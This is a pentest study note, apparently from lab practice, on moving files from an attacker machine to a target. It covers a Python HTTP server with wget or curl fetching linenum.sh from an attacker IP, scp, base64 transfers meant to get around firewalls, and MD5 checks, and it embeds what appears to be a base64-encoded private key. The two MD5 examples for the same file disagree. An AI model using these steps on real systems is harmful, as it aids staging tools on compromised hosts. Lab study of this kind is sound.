---
id: Transferring Files
aliases: []
tags:
  - Pentest/File-Transfer/Transferring-Files
---

# Transferring files

___

<!-- Python HTTP Server {{{-->
## Python HTTP Server

Run a [Python HTTP Server](https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Tools_and_setup/set_up_a_local_testing_server)
on the attacker machine and use [[Wget]] or [[cURL]]
to download the file(*s*) to the remote host

1. **ATTACKER**: Run Python HTTP server

```sh
sudo python3 -m http.server 8000
```

2. **TARGET**: Acquire the files from the remote host

```sh
wget http://10.10.14.1:8000/linenum.sh
```

```sh
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```
___
<!-- }}} -->

<!-- SCP {{{-->
## SCP

It is possible to transfer files using `scp` once

- SSH connection is established
- User credentials are known

**ATTACKER**: Copy the file to the remote machine

```sh
scp linenum.sh <user>@<target>:/tmp/linenum.sh
```
___
<!-- }}} -->

<!-- Base64 {{{-->
## Base64

It may be not possible to transfer files
if (*for example*) the remote host has firewall protection

<!-- Info - Base64 {{{-->
> [!info]- Base64
>
> [Base64](https://en.wikipedia.org/wiki/Base64)
> is a [binary-to-text encoding](https://en.wikipedia.org/wiki/Binary-to-text_encoding)
> that uses 64 printable characters to represent each 6-bit segment
> of a sequence of byte values
>
> Binary-to-text encodings enables transmitting binary data
> on a communication channel that only supports text
<!-- }}} -->

1. **ATTACKER**: Encode the binary file to base64

```sh
base64 <file> -w 0
```

```sh
cat <file> | base64 -w 0; echo
```

<!-- Info {{{-->
> [!info]-
>
> - `-w`, `--wrap=COLS`: Wrap encoded lines after COLS character (*default 76*)
>   (*0 to disable line wrapping*)
<!-- }}} -->

2. **TARGET**: Copy the base64 string to the terminal to decode it

**Linux**

```sh
echo <base64_string> | base64 -d > <file>
```

**Windows**

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\<out_file>", [Convert]::FromBase64String("<base64_string>"))
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Validate File Transfers {{{-->
## Validate File Transfers

Validate the format of the file

1. **ATTACKER**: Run [md5sum](https://en.wikipedia.org/wiki/Md5sum)
   on the file for reference

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

2. **TARGET**: Validate the hash

**Linux** (*[md5sum](https://en.wikipedia.org/wiki/Md5sum)*)

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

**Windows** (*[Get-FileHash](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.5&viewFallbackFrom=powershell-7.2)*)

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
> ```
> ```powershell
> Algorithm       Hash                                                                   Path
> ---------       ----                                                                   ----
> MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
> ```
<!-- }}} -->

> [!warning]
>
> Windows Command Line utility (*cmd.exe*) has a maximum string length
> of 8,191 characters.
>
> Also, the web shell may error when extremely large strings are sent.

___
<!-- }}} -->
